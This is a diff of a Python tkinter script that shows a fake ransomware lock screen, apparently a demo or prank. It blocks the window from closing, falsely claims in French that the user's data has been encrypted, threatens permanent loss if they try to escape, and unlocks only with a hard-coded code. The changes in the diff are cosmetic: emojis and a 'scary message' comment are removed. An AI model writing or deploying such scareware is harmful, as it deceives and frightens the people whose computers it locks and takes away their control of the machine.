@@ -33,7 +33,7 @@ for t in touches:
 root.bind('<Button-3>', ignore)
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-# Message effrayant
+
 tk.Label(root, text="💀 VOS DONNEES ONT ETE CHIFFRER 💀", font=("Arial",32,"bold"), fg="red", bg="black").pack(pady=20)
 tk.Label(root, text="TOUTE TENTATIVE DE CONTOURNEMENT (Ctrl+Alt+Suppr, redémarrage)\n"
                     "ENTRAÎNERA LA PERTE DÉFINITIVE DE VOS DONNÉES.\n"
@@ -50,15 +50,15 @@ def valider():
     if entry.get() == "DEMO2026":
         for w in root.winfo_children():
             w.destroy()
-        tk.Label(root, text="✅ DÉBLOQUÉ AVEC SUCCÈS ✅\nFermeture dans 3 secondes",
+        tk.Label(root, text=" SYSTEME DEVEROUILLER \nFermeture dans 3 secondes",
                  font=("Arial",24,"bold"), fg="lime", bg="black").pack(expand=True)
         root.after(3000, lambda: [root.grab_release(), root.destroy()])
     else:
         entry.delete(0, 'end')
-        tk.Label(root, text="❌ CODE INCORRECT - ENCORE UNE ERREUR ET VOUS PERDEZ TOUS ! ", fg="red", bg="black").pack()
+        tk.Label(root, text=" CODE INCORRECT - ENCORE UNE ERREUR ET VOUS PERDEZ TOUS ! ", fg="red", bg="black").pack()
 
 tk.Button(root, text="DÉBLOQUER", font=("Arial",20,"bold"), command=valider, bg="lime", width=20).pack(pady=15)
-tk.Label(root, text="🔓  789bf0d234de0e8c78319c78ac1fe0485082b062f900322176f500c0c1c12ccc 🔓", font=("Courier",18,"bold"), fg="cyan", bg="black").pack(side="bottom", pady=20)
+tk.Label(root, text="789bf0d234de0e8c78319c78ac1fe0485082b062f900322176f500c0c1c12ccc ", font=("Courier",18,"bold"), fg="cyan", bg="black").pack(side="bottom", pady=20)
 
 root.mainloop()
 
